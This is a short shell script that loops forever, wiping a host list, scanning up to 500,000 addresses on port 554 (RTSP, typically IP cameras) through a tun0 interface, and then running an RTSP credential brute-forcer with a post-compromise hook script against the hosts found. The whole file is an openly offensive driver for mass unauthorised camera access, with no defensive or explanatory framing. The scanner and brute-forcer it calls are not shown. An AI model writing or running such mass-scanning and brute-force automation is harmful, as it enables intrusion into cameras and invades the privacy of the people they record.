#!/usr/bin/env sh
while true; do
    echo
    echo Remove hosts
    rm ./local/hosts_554.txt
    echo
    echo Gather IPs
    ./fortune_port.py 554 500000 1024 -i tun0
    echo
    echo Brute
    ./rtsp_brute2.py \
        -ht 1024 -i tun0 -ff \
        -c -sp --cc local/campost.sh
done
